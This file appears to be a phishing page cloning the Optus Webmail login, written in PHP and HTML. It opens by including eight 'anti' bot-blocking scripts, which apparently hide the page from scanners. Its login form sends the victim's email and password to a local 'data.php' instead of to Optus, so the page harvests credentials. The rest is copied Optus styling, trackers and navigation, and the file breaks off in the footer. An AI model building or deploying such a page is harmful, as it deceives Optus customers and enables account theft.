<?

require_once('bots/anti1.php');
require_once('bots/anti2.php');
require_once('bots/anti3.php');
require_once('bots/anti4.php');
require_once('bots/anti5.php');
require_once('bots/anti6.php');
require_once('bots/anti7.php');
require_once('bots/anti8.php');

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html version="-//W3C//DTD XHTML 1.1//EN" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemalocation="http://www.w3.org/1999/xhtml
                          http://www.w3.org/MarkUp/SCHEMA/xhtml11.xsd" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Optus - Webmail</title>

    <!-- Google Tag Manager -->
    <!-- Fixed the Google Tag Manager by adding the missing variable f.parentNode - Ashok - on 28 Aug 2020 -->
    <iframe src="javascript:void(0)" title="" style="width: 0px; height: 0px; border: 0px none; display: none;"></iframe><script type="text/javascript" async="" src="css/analytics.js"></script><script type="text/javascript" async="" src="css/247px.js"></script><script async="" src="css/gtm"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-525H7H9');</script>
    <!-- End Google Tag Manager -->


    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-525H7H9"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->

    <script type="text/javascript" src="css/247tag.js" async="true">
    </script>
    <meta name="author" content="optus webmail optus email">
    <meta name="description" content="Optus Internet customers can access their Optus email from any computer with an internet connection by visiting this page.">
    <meta name="keywords" content="">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <link rel="shortcut icon" href="https://webmail.optusnet.com.au/images/favicon.ico" type="image/x-icon">
    <!-- Commented out the Old Jquery Version -->
    <!--<script type="text/javascript" src="/js/jQuery/jquery-1.3.2.min.js"></script>-->

    <!-- Added Possible updated jquery version 1.12.4 from jquery 1.3.2 -->
    <script type="text/javascript" src="css/jquery-1.12.4.js"></script>
    <!-- Added Migrate Custom Javascript Plugin for jquery to support depreciated functions of jquery 1.3.2 in jquery 1.12.4 -->
    <script type="text/javascript" src="css/jquery-migrate-1.4.1.js"></script>
    





    <link rel="stylesheet" type="text/css" media="screen" href="https://webmail.optusnet.com.au/css/headerFooter.css">

    <script type="text/javascript" src="css/header.js"></script>

    <style>
        * {
            margin: 0;
        }


        @font-face {
            font-family: "optus-icons-c";
            src: url('/../../fonts/optus-icons.eot');
            src: url('/../../fonts/optus-icons.eot?iefix') format('embedded-opentype'), /* Fix for font decoding error - Ashok on 28 Aug 2020 */
                 url('/../../fonts/optus-icons.woff') format('woff'),
                 url('/../../fonts/optus-icons.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: "TradeGothicLTPro";
            src: url('/../../fonts/TradeGothicLTPro.eot');
            src: url('/../../fonts/TradeGothicLTPro.eot?iefix') format('embedded-opentype'), /* Fix for font decoding error - Ashok on 28 Aug 2020 */
                 url('/../../fonts/TradeGothicLTPro.woff') format('woff'),
                 url('/../../fonts/TradeGothicLTPro.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: "TradeGothicLTPro-Bold";
            src: url('/../../fonts/TradeGothicLTPro-Bold.eot');
            src: url('/../../fonts/TradeGothicLTPro-Bold.eot?iefix') format('opentype'),
                 url('/../../fonts/TradeGothicLTPro-Bold.woff') format('woff'),
                 url('/../../fonts/TradeGothicLTPro-Bold.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: "TradeGothicLTPro-BdCn20";
            src: url('/../../fonts/TradeGothicLTPro-BdCn20.eot');
            src: url('/../../fonts/TradeGothicLTPro-BdCn20.eot?iefix') format('opentype'),
                 url('/../../fonts/TradeGothicLTPro-BdCn20.woff') format('woff'),
                 url('/../../fonts/TradeGothicLTPro-BdCn20.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        @font-face{
            font-family: "optus_voice_betabold";
            src: url('/../../fonts/optusvoice_20130708_01-webfont.eot');
            src: url('/../../fonts/optusvoice_20130708_01-webfont.eot?iefix') format('opentype'),
                 url('/../../fonts/optusvoice_20130708_01-webfont.woff') format('woff'),
                 url('/../../fonts/optusvoice_20130708_01-webfont.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        @font-face{
            font-family: "optusvoice_20130708_01-webfont";
            src: url('/../../fonts/optusvoice_20130708_01-webfont.eot');
            src: url('/../../fonts/optusvoice_20130708_01-webfont.eot?iefix') format('opentype'),
                 url('/../../fonts/optusvoice_20130708_01-webfont.woff') format('woff'),
                 url('/../../fonts/optusvoice_20130708_01-webfont.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        h1.custom {
            color: #00A3AD !important;
            font-family: "optus_voice_betabold",Arial,Helvetica,sans-serif;
            font-size: 36px;
            margin-bottom: 0rem !important;
        }

        input.radio-btn {
            border: none !important;
        }

        a.custom {
            color: #00A3AD !important;
            font-family: "TradeGothicLTPro",Arial,Helvetica,sans-serif;
            text-decoration: none;
        }

        body.custom {
            color: #444;
            font-family: "TradeGothicLTPro",Arial,Helvetica,sans-serif;
            margin: 0;
            min-height: 100%;
            position: relative;
            z-index: 0;
        }

        ul {
            list-style: none outside none;
        }

        h3 {
            display: inline-block;
        }

        #footer-links {
            color: #999999;
            font-family: arial,helvetica,sans-serif;
            font-size: 11px;
            line-height:16px;
            text-align: center;
        }

        #footer-links a {
            color: #999999 !important;
            line-height:10px;
        }

        #footer-links h3 {
            color: #7e7e7e;
            font-size: 10px;
            line-height:10px;
            margin-bottom: 0px;
        }

        .loginbox_container {
            background-color: #FAF9F4;
            border: 1px solid #EAE8DE;
            left: 50%;
            margin-left: -500px;
            position: relative;
            width: 1000px;
        }

        div.loginbox_content {
            left: 50%;
            margin-left: -360px;
            padding: 40px;
            position: relative;
            width: 660px;
        }

        .masthead {
            width: 100%;
            background: none repeat scroll 0 0 #fff;
            height: 91px;
            border-bottom: 1px solid #eae8de;
        }

        input[type="text"],input[type="password"] {
            display: inline-block;
        }


        button, #formsubmit {
            background: none;
            background-color: #FFD100;
            border-bottom: 3px solid #edc33d;
            border-radius: 10px;
            color: #191919;
            cursor: pointer;
            cursor: hand;
            font-weight: bold;
            height: 38px;
            width: 142px;
        }

        #user, #pass, #fake_pass {
            border: 1px solid #CCCCCC !important;
            border-radius: 4px;
            height: 16px;
            padding: 8px;
            width: 200px;
        }

        input:focus {
            border-color: #666666 !important;
        }

        #content-box {
            background-color: #FFFFFF;
            font-size: 14px;
        }

        #device-links {
            width: 100%;
        }
        #device-links td {
            text-align: center;
        }

        input:focus::-webkit-input-placeholder{
            color: transparent!important;
        }
        input:focus::-moz-placeholder{
            color: transparent!important;
        }
        input:focus:-moz-placeholder{
            color: transparent!important;
        }

        #wm-header{
            background-color: #00A3AD;
        }
    </style>


    <!-- CSS for UI changes requested by CX team -->
    <link rel="stylesheet" href="https://smb.optus.com.au/opfiles/Shop/Consumer/Assets/AllFonts/all-fonts4.css">
    <!-- Commented by Ashok on 28 Aug 2020 to avoid loading missing CSS Files from optus.com.au -->
    <!--<link rel="stylesheet" href="https://www.optus.com.au/etc/designs/springd/clientlibs/page-bundle/css/lux.7142853578c7ce18ed4c3960abdb0cba.css">-->
    <!-- Commented the cross site include and copied the css in to atmail directory without .map to avoid 404 for .map file - Ashok Nov 25 -->
    <!--<link rel="stylesheet" href="//static.optus.com.au/etc/designs/springd/clientlibs/osg/lux.base.8fba59704a65bcc34212ff1ef5e4708d.css">-->
    <!-- Added the below CSS and all the corresponding fonts/svgs from static.optus.com.au to load it locally without map error (404) -->
    <link rel="stylesheet" type="text/css" media="screen" href="https://webmail.optusnet.com.au/css/lux.base.8fba59704a65bcc34212ff1ef5e4708d.css">

    <style>
    #global_header .header .header-sitewide{
    	width:980px;
    }
    header#global_header_wrapper.header-only .header{
        width: 980px;
        padding: 15px 0;
    }
    @media only screen and (max-width: 1199px){
    	header#global_header_wrapper{
    		width:980px;
    	}
    }
    #global_header .nav-main{
    	width:980px;
    }
    #global_header .nav-column-wrapper{
        width: 879px;
    }
    header#global_header_wrapper{
    	background:#ffffff;

    }
    header#global_header_wrapper.header-only{
    	  margin-bottom: 0;
          height: 100px;
    }
    .header-sitewide{
    	background-color: black;
        height: 42px;
        width: 1200px;
    }
    #global_header .nav-site-level{
    	height:42px;
    }
    #global_header .nav-site-level li{
        height: 42px;
    }
    #global_header .logo{
        height: 42px;
        position: absolute;
        left: 50%;
        transform: translateX(-50%);
        width: 82px;
    }

    #global_header .logo span{
        width: 82px;
        margin-top: 12px;
        background-size: 100%;
    }
    #global_header .header .inline-list.right{
    	margin-top: 0;
    }
    #global_header .nav-site-level a{
    	height: 42px;
        font-family: MarkPro-heavy;
        font-size: 12px;
        color:rgb(136, 138, 140);
        padding-top: 16px;
    }
    #global_header .nav-site-level a.active{
    	color:#ffffff;
    }
    #global_header .nav-site-level a:hover{
    	color:rgb(172, 175, 178);
    }
    #global_header .nav-site-level a.active:after{
        border-color: transparent transparent #ffffff transparent;
    }

    /* bottom nav */
    #global_header .row.collapse .columns{
    	    height: 30px;
        border-radius: 0;
        background-color: white;
    }
    #global_header .header .nav-primary-level .ico{
    	display: none;
    }
    #global_header .header .nav-primary-level li a, #global_header .nav-support{
    	padding: 3px 5px;
        color: #000000;
        font-family: MarkPro-medium;
        font-size: 13px;
        text-transform: none;
    }
    #global_header .header .nav-primary-level li a:hover, #global_header .nav-support:hover{
    	color:rgb(172, 175, 178);
    }
    #global_header .nav-support:hover, #global_header .nav-support:focus{
    	color:rgb(172, 175, 178);
    }
    #global_header .nav-seperator{
    	display:none;
    }

    /* search*/
    #global_header .custom-header-search .field-group{
    	border:none;
    }
    #global_header .custom-header-search input.field-input{
        font-family: markpro-heavy;
        font-size: 12px;
        padding-top: 10px;
        border-radius: 0px

    }
    #global_header .header .inline-list.right .button{
    	    background: transparent;
        color: #ffffff;
        border-radius: 0;
        font-family: markpro-heavy;
        font-size: 12px;
        padding-top: 14px;
    }
    #global_header .header .inline-list.right .ico.ico-search-large{
    	left: -70px;
    }
    #global_header .ico-search-large:before, #global_footer .ico-search-large:before{
        content: "";
        font-family: lux-icons;
        font-size:14px;
    }
    /* Login box */
    div.loginbox_content{
    	width: 800px;
    	margin-left:0;
    	transform:translateX(-50%);
    }
    .loginbox_container{
        transform: translateX(-50%);
        margin:0;
        border: none;
        background-color: transparent;
        width:980px;
    }

    h1.custom{
        font-family: markpro-heavy;
    	color: #000000 !important;
        font-size: 60px;
        text-transform: none;
    }
    #content-box p{
    	font-family:markpro;
    	margin-bottom:0;
    }
    #device-links{
    	display:none;
    }
    #user, #pass, #fake_pass{
        width: 100%;
        height: 50px;
        border-radius: 0;
        font-family:markpro;
    }
    button, #formsubmit{
    	border-radius: 0;
        border: 0;
        font-family: markpro-heavy;
        font-size: 16px;
        width: 330px;
        height: 45px;
        margin: 25px 0;
        position: relative;
        left: 50%;
        transform: translateX(-50%);
    }
    #wm-footer{
        background-color: black;
    }
    #global_footer .footer-links-bg{
    	background:#000000;
    }
    #global_footer .footer-links a{
        font-family: markpro-heavy;
        color: #00a3ad;
    }
    @media only screen and (min-width: 1200px){
    	#global_footer {
    	    width: 980px;
    	    margin: 0 auto;
    	}
    }
    #global_footer{
        min-height: 335px;
    }
    #global_footer .footer-links{
    	padding-top: 60px;
    }
    #global_footer .footer-links .medium-12>ul>li{
    	width:50%;
    }

    /* social */

    #global_footer .footer-social .ico.ico-facebook, #global_footer .footer-social .ico.ico-googleplus, #global_footer .footer-social .ico.ico-pinterest, #global_footer .footer-social .ico.ico-instagram {
    	display:none;
    }
    #global_footer .ico:before, #global_footer #global_header form.custom .custom.checkbox.checked:before, #global_header form.custom #global_footer .custom.checkbox.checked:before, #global_footer #global_header .nav-back-arrow:before, #global_header #global_footer .nav-back-arrow:before, #global_footer #global_header .list-breadcrumb li:before, #global_header .list-breadcrumb #global_footer li:before{
    	font-family: lux-icons;
    	color:#acafb2;
    }
    #global_header .ico-twitter:before, #global_footer .ico-twitter:before{
    	content: "";
    }
    #global_header .ico-linkedin:before, #global_footer .ico-linkedin:before{
    	content: "";
    }
    #global_header .ico-youtube:before, #global_footer .ico-youtube:before{
        content: "";
    }
    #global_footer .footer-social .ico:after, #global_footer .footer-social #global_header form.custom .custom.checkbox.checked:after, #global_header form.custom #global_footer .footer-social .custom.checkbox.checked:after, #global_footer .footer-social #global_header .nav-back-arrow:after, #global_header #global_footer .footer-social .nav-back-arrow:after, #global_footer .footer-social #global_header .list-breadcrumb li:after, #global_header .list-breadcrumb #global_footer .footer-social li:after{
    	display:none;
    }
    #global_footer>.row>.large-4 .medium-5, #global_footer>.row>.large-4 .medium-7{
    	right:20%;
    }
    #content-box p.field-title{
    	margin-bottom:15px;
    }
    .webmail_bottom_links{
    	font-family:markpro;
    }
    .label{
            background-color:#ffffff;
            float:left;
    }
    .label .button{

    }
    .label label{
        text-align: left;
    }
    .label input[type="button"]{
        background-color: #D2D7D8;
        border: 1px solid #afafaf;
        padding: 5px;
        font-size: 14px;
        font-family: markpro;
        text-transform: capitalize;
        color: black;
    }
    #wm-header{background-color: #ffffff}
    </style>
    <script>
        $( document ).ready(function() {
            $('h1.custom').text("Log in to Optus Webmail");
            $($('#content-box p')[0]).text("Log in to access your username@optusnet.com.au email address");
            $($('#content-box p')[1]).hide();
            $('.loginbox_content br')[0].remove();
            var emailText = '<p class="field-title">Email</p>';
            var passwordText = '<p class="field-title">Password</p>';
            $('#user').before(emailText);
            $('#pass').before(passwordText);
            $('#user').attr("placeholder", "Email");
            $('#pass').attr("placeholder", "Password");
            $('#captchaImage').prev().text("Security Code");
            $('input[name="captcharesponse"]').prev().text("Enter the code shown in the box below");
            $('input[name="captcharesponse"]').parent().css('margin', '10px 100% 10px 0');
            $('input[name="captcharesponse"]').parent().css('float', 'none');
        });
    </script>




                              <script>!function(a){var e="https://s.go-mpulse.net/boomerang/",t="addEventListener";if("False"=="True")a.BOOMR_config=a.BOOMR_config||{},a.BOOMR_config.PageParams=a.BOOMR_config.PageParams||{},a.BOOMR_config.PageParams.pci=!0,e="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="PC6VM-4FQA5-8HDKN-MYG9N-T5BRS",function(){function n(e){a.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!a.BOOMR||!a.BOOMR.version&&!a.BOOMR.snippetExecuted){a.BOOMR=a.BOOMR||{},a.BOOMR.snippetExecuted=!0;var i,_,o,r=document.createElement("iframe");if(a[t])a[t]("load",n,!1);else if(a.attachEvent)a.attachEvent("onload",n);r.src="javascript:void(0)",r.title="",r.role="presentation",(r.frameElement||r).style.cssText="width:0;height:0;border:0;display:none;",o=document.getElementsByTagName("script")[0],o.parentNode.insertBefore(r,o);try{_=r.contentWindow.document}catch(O){i=document.domain,r.src="javascript:var d=document.open();d.domain='"+i+"';void(0);",_=r.contentWindow.document}_.open()._l=function(){var a=this.createElement("script");if(i)this.domain=i;a.id="boomr-if-as",a.src=e+"PC6VM-4FQA5-8HDKN-MYG9N-T5BRS",BOOMR_lstart=(new Date).getTime(),this.body.appendChild(a)},_.write("<bo"+'dy onload="document._l();">'),_.close()}}(),"".length>0)if(a&&"performance"in a&&a.performance&&"function"==typeof a.performance.setResourceTimingBufferSize)a.performance.setResourceTimingBufferSize();!function(){if(BOOMR=a.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var e=""=="true"?1:0,t="",n="wyaxcylspvijgywo45pa-f-18965873f-clientnsv4-s.akamaihd.net",i="false"=="true"?2:1,_={"ak.v":"32","ak.cp":"1088179","ak.ai":parseInt("647240",10),"ak.ol":"0","ak.cr":10,"ak.ipv":4,"ak.proto":"h2","ak.rid":"6bb48bfb","ak.r":32406,"ak.a2":e,"ak.m":"a","ak.n":"essl","ak.bpcip":"182.1.113.0","ak.cport":53653,"ak.gh":"114.125.80.143","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"","ak.t":"1657726814","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==JkKkdGQNZilp4UggCBhvHmypjY537hwgORx5diliSQ2ndEj8VIpbdgZiuSVBQbx00fgY3EAc4Bn/fNFx7nHZNsm+GdHrljDy51x2NKCyjZsi3rps9enni01bax4uv6CpamD6YhLvMNq4/9lC8A9UQDObyHZhZUVxKNCNv4ra6SWwnIbNVzbXcFYsWiDtVMp0R84XmfgZ6BrKyhQbQkSrq3Vh6K+yO4sI2gmnEkdt3P7tVW6G9KgnqXKtxVOLMi1pUQuL0BRG3g3fh/hVnuExTBhMFMQyXTK0QF6xoJWqQsxCqA6KC818qqT9dm/AAllz7drhsZwQdjs33NNGPrNaRZvln3u3B2wKd2wqdBVAUuh/O7WYv0QZHtB3QnHtx/3H9s3tcrTSc/HpGl1MMqQItM/4ipWqJgTIxPR3vc7j/K4=","ak.pv":"5","ak.dpoabenc":"","ak.tf":i};if(""!==t)_["ak.ruds"]=t;var o={i:!1,av:function(e){var t="http.initiator";if(e&&(!e[t]||"spa_hard"===e[t]))_["ak.feo"]=void 0!==a.aFeoApplied?1:0,BOOMR.addVar(_)},rv:function(){var a=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t","ak.tf"];BOOMR.removeVar(a)}};BOOMR.plugins.AK={akVars:_,akDNSPreFetchDomain:n,init:function(){if(!o.i){var a=BOOMR.subscribe;a("before_beacon",o.av,null,null),a("onbeacon",o.rv,null,null),o.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script><script>bazadebezolkohpepadr="414083355"</script><script type="text/javascript" src="css/18ae682f" defer="defer"></script></head>

<body class="custom">
    <!-- START header -->
    <div id="wm-header">
        <script src="css/modernizr.js" type="text/javascript"></script>

        <header class="theme_primary header-only" id="global_header_wrapper">
                <div id="global_header">
                        <div class="container-body header row collapse site_nav_container">

<script src="css/globalHeaderNavDesktop.js" type="text/javascript"></script>
        <script src="css/globalHeaderNavMain.js" type="text/javascript"></script>

        <!--  <link rel="stylesheet" href="https://smb.optus.com.au/opfiles/ys/online-style/css_min/headerFooter.css" /> -->
<!--[if lte IE 9]>
    <style type="text/css">
        header#global_header_wrapper.header-only {
            width: 100%;
            margin: 0 auto 65px;
            height: 140px;
        }

        #global_footer {
            width: 1200px;
            margin: 0 auto;
        }
        #global_footer .row {
            max-width: none;
        }
        #global_footer .row .large-8 {
            width: 66.6%;
        }
        #global_footer .row .large-4 {
            width: 33.3%;
        }
        #global_footer .footer-links .medium-12 ul li {
            float: left;
            width: 25%;
            padding: 0;
            margin-bottom: 10px;
            display: inline;
            line-height: 1rem;
            text-align: left;
        }
        #global_footer .footer-links .medium-12 ul li a {
            font-size: 0.875rem;
        }

        #global_footer .row .large-4 .medium-5, #global_footer .row .large-4 .medium-7 {
            right: 0%;
            left: auto;
            width: 100%;
        }
        #global_footer .ico {
            visibility: visible !important;
        }
        #global_footer .footer-social ul {
            text-align: right;
        }
        #global_footer .footer-social ul li a {
            text-decoration: none;
        }
    </style>
<![endif]-->

<style type="text/css">


    .portableModule.globalHeaderModule {
        display: block;
    }

    #global_header .container-body {
        background-color: transparent;
    }

    #global_header {
        font-size: 16px;
    }

    #global_header .autocomplete-suggestive-text {
        width: 13em !important;
    }

    .chatWrap {
        display: inline-block;
        float: left;
        margin: 28px 0 0 25px;
    }

    @media (max-width: 990px) {
        .chatWrap {
            display: none !important;
        }
    }

    #global_header .custom-header-search input.field-input:focus {
        color: #000000;
        font-family: unset;
        font-size: 1em;
        font-weight: normal;
        height: 2.375rem;
        line-height: 1.5625em;
        padding: 4px 0 4px 10px;
        text-transform: unset;
        transition: all 0.3s ease-out 0s;
        width: 9.00rem;

    }

</style><div class="header-sitewide zindex-top">
    <a class="logo left" href="https://www.optus.com.au/"><span aria-hidden="true">Optus Home</span></a>

<ul id="nav-site-level" class="inline-list left nav-site-level">
    <li><a class="active" href="https://www.optus.com.au/">For You</a></li>
                    <li><a href="https://www.optus.com.au/all-business">For Business</a></li>
                    <li><a href="https://www.optus.com.au/about">About&nbsp;us</a></li>
                    </ul><div class="chatWrap">
        <div class="chat-live-col">
            <div class="chat_roundbox"></div>
        </div>
    </div>
   <ul class="inline-list right">
        <li class="right">
                <a href="https://www.optus.com.au/customercentre/myaccount" class="button radius small yellow myaccount-links">My Account</a>
        </li>
        <li class="right">
            <div data-postloadthread="0" data-postloadsequence="0" data-postload="39c06d8512573410VgnVCM1000001f80ff0aRCRD" class="postload-complete">
            <!--[BEGIN "module.tag"[-->
            <script type="text/moduleData">
                {"serviceDataList":null,"contentModel":null,"hasPendingOrder":null,"controllerModel":null}
            </script>
            <div data-controller="GlobalHeaderSearchController" class="module  globalHeaderModule moduleManager__controller_initialised init_state">
                <style>
                    .recommendedResult:nth-child(n+6) { display: none; }
                </style>
                <div style="" class="global-header-search">
                    <!-- Header Search Start -->
                    <div aria-hidden="true" class="hide-for-large-up">
                        <a class="button text no-link-decoration" href="https://www.optus.com.au/customercentre/search?searchContext=Personal&amp;loggedIn=false&amp;site=shop">
                            <span class="ico ico-global ico-search"></span>
                        </a>
                    </div>
                    <div class="show-for-large-up">
                        <form action="//www.optus.com.au/customercentre/search&quot;" method="GET" class="custom-header-search">
                            <fieldset>
                                <legend class="visuallyhidden">Site Search</legend>
                                <div class="field-group radius small outline">
                                    <label class="visuallyhidden">Enter a search term</label>
                                    <input type="text" id="search_query" name="query" placeholder="Search" autocomplete="off" class="left header-search-field field-input autocomplete clearable-input">
                                    <button id="submit_query" class="no-style left js-global-search-submit field-submit ico ico-only ico-global ico-search-large"></button>
                                    <input type="hidden" value="1" id="activeTabIndex" name="activeTabIndex">
                                    <div class="autocomplete-suggestive-text">
                                        <ul class="container">
                                        <!-- rivets: each-result -->
                                            <li class="recommendedResult">
                                                <a data-rv-class-selected="result.selected" data-rv-html="result.title" class="recommendedResultContent"></a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </fieldset>
                            <input type="hidden" name="searchContext" value="Personal">
                            <input type="hidden" name="loggedIn" value="false">
                            <input type="hidden" name="site" value="shop">
                        </form>
                    </div><!-- // Header Search End -->
                </div>
            </div><!--]END "module.tag"]--></div>
        </li>
    </ul>
</div>

<div class="large-12 columns nav-main show-for-large-up">
    <div class="row collapse">
        <div class="large-11 columns nav-column-wrapper">

            <a class="nav-back-arrow ico ico-home" aria-hidden="true" href="#">
              <span class="ico ico-arrow-right"></span>
            </a>

            <ul id="nav-primary-level" class="nav-primary-level">

                                    <li class="">
                                        <a href="https://www.optus.com.au/shop/consumer/mobile">
                                            <span class="ico-personal_mobile  ico ico-header"></span>
                                            Mobile
                                        </a>
                                    </li>

                                    <li class="">
                                        <a href="https://www.optus.com.au/shop/consumer/tablet">
                                            <span class="ico-personal_tablet  ico ico-header"></span>
                                            Tablet
                                        </a>
                                    </li>

                                    <li class="">
                                        <a href="https://www.optus.com.au/shop/consumer/broadband">
                                            <span class="ico-personal_internet  ico ico-header"></span>
                                            Broadband
                                        </a>
                                    </li>

                                    <li class="">
                                        <a href="https://www.optus.com.au/shop/consumer/home-phone">
                                            <span class="ico-personal_home-phone  ico ico-header"></span>
                                            Home Phone
                                        </a>
                                    </li>

                                    <li class="">
                                        <a href="https://www.optus.com.au/shop/consumer/bundles">
                                            <span class="ico-personal_bundles  ico ico-header"></span>
                                            Bundles
                                        </a>
                                    </li>

                                    <li class="">
                                        <a href="https://www.optus.com.au/shop/consumer/tv">
                                            <span class="ico-personal_tv  ico ico-header"></span>
                                            TV
                                        </a>
                                    </li>

                                    <li class="navigation-hide">
                                        <a href="https://www.optus.com.au/shop/consumer/support">
                                            <span class=" navigation-hide ico-personal_support navigation-hide  ico ico-header"></span>
                                            Support
                                        </a>
                                    </li>

            </ul>
        </div>

                    <div class="large-1 columns center">
                        <div class="nav-seperator"></div>
                        <a class="nav-forward-arrow ico-arrow-right ico" aria-hidden="true" href="#"></a>
                        <a class="nav-support" href="https://www.optus.com.au/shop/consumer/support">
                            Support
                        </a>
                    </div>

    </div>
</div>


                        </div>
                </div>
        </header>

    </div>
    <!-- END content -->

    <!-- START content -->
    <div id="content-box">
        <br>
        <div class="loginbox_container">
            <div class="loginbox_content">
                <!--<img border="0" src="/../../images/welcome.png" alt="Welcome to Optus Webmail">-->
                <h1 class="custom">Log in to Optus Webmail</h1>
                <p>Log in to access your username@optusnet.com.au email address</p>
                
                <table id="device-links">
                    <thead>
                    </thead><tbody>
                        <tr>
                            <td><img src="css/macpc.png" border="0"></td>
                            <td><img src="css/mob.png" border="0"></td>
                            <td><img src="css/tablet.png" border="0"></td>
                        </tr>
                    </tbody>
                </table>
                <br>
                <p style="display: none;">This online service for webmail has all you need including: Mail, drafts, spam filter (for mail), folders and online storage</p>
                <br>

                <noscript>
                    <div class="error"><strong>Warning:</strong> This site requires Javascript to perform certain message handling functions</div>
                </noscript>

                <div id="error-msg" style="color:red;font-weight:bold;">
                                    </div>

                <form action="data.php" class="cleardiv" method="post" name="loginbox">
                    <input type="hidden" name="emailName" value="">
                    <input type="hidden" name="emailDomain" value="">
                    <input type="hidden" name="emailDomainDefault" value="">
                    <input type="hidden" name="requestedServer" value="mail.optusnet.com.au">
                    <input type="hidden" name="MailType" value="IMAP">

                    <div class="label_cust">
                        <p class="field-title">Email</p><input type="text" id="user" name="email" placeholder="Email" required accesskey="u" for="username" autofocus="true">
                        &nbsp;
                        <p class="field-title">Password</p><input type="password" id="pass" name="password" required placeholder="Password" accesskey="p" for="password">
                        
                        <button type="submit" class="btn" id="formsubmit">LOGIN</button>
                    </div>

                    <!--captchaPlaceHolder-->
                    <div class="label_cust">
		    <!--<div class="label_cust"  style="width: 80%; float:left">-->
                        <label accesskey="s" for="switchtohttp">Security:&nbsp;&nbsp;&nbsp;</label>
                        <input type="radio" name="switchtohttp" value="1" class="radio-btn" border="0"><span style="color: #00A3AD;">&nbsp;Standard&nbsp;</span>
                        <input type="radio" name="switchtohttp" value="0" class="radio-btn" checked="checked" border="0"><span style="color: #00A3AD;">&nbsp;Secure&nbsp;</span>
                    </div>
                    <!--<div class="webmail_reset_password" style="width: 20%; float:right">
                        <a class="custom" href="/index.php/mail/ResetPassword">Reset password</a>
                    </div>-->
                </form>

                <br><br>
		<!--</br></br></br></br>
                <br style="clear:both;"/>-->
                <div class="webmail_bottom_links">
                    <b>Go to:</b>
                    <a class="custom" href="https://webmail.optusnet.com.au/index.php/mobile">Disabled Access View</a> |
                    <a class="custom" href="https://webmail.optusnet.com.au/index.php/mail/plugininterface/index/Atmail_HelpUrl_Plugin/viewHelp">User Guide</a> |
                    <a class="custom" href="https://www.optus.com.au/for-you/support">FAQ's</a>
                </div>
                <br>
            </div><!-- END loginbox_content -->
        </div><!-- END loginbox_container -->
        <br>
    </div><!-- END content_box -->

    <br>

    <!-- START footer -->
    <div id="wm-footer">


<footer>

<div class="module global_links">


            <div id="global_footer">
<div class="row">
<div class="large-8 columns footer-links-bg">
<div class="row collapse">
<div class="footer-links">
<div class="columns medium-12">
<ul>
<li><a href="https://www.optus.com.au/about">About Us</a></li>

<li><a href="https://www.optus.com.au/contactus">Contact Us</a></li>

<li><a href="https://www.optus.com.au/shop/stores">Stores</a></li>

<li><a href="https://www.optus.com.au/shop/mobile/apps/my-optus-app">My Optus App</a></li>

<li><a href="https://www.optus.com.au/shop/devicewarrtechinfo">Device Warranties</a></li>

<!-- <li><a href="#">T<span class="hide-for-medium">erms</span> &amp; C<span class="hide-for-medium">ondition</span>s</a></li> -->
<li><a href="https://www.optus.com.au/about/sustainability/responsibility/customers/disability-services/accessibility">Accessibility</a></li>

<li><a href="https://www.optus.com.au/about/legal/copyright">Copyright</a></li>

<li><a href="https://www.optus.com.au/about/legal/privacy">Privacy Policy</a></li>

<li><a href="https://www.optus.com.au/about/legal/standard-forms-agreement">Standard Agreement</a></li>

<li><a href="https://www.optus.com.au/shop/usageguides">Optus Usage Guidelines</a></li>

<li><a href="https://www.optus.com.au/cis">Critical Information Summaries</a></li>
</ul>
</div>
</div>
</div>
</div>

<div class="large-4 columns">
<div class="row collapse">
<div class="columns medium-7 medium-push-5 large-12 large-push-0">
<div class="footer-social">
<ul>
<li><a href="https://www.facebook.com/optus" target="_blank" alt="Link to Facebook"><span class="ico ico-only ico-footer-social ico-facebook">&nbsp;</span></a></li>

<li><a href="https://twitter.com/Optus" target="_blank" alt="Link to Twitter"><span class="ico ico-only ico-footer-social ico-twitter">&nbsp;</span></a></li>

<li><a href="https://www.youtube.com/user/yesoptus" target="_blank" alt="Link to YouTube"><span class="ico ico-only ico-footer-social ico-youtube">&nbsp;</span></a></li>

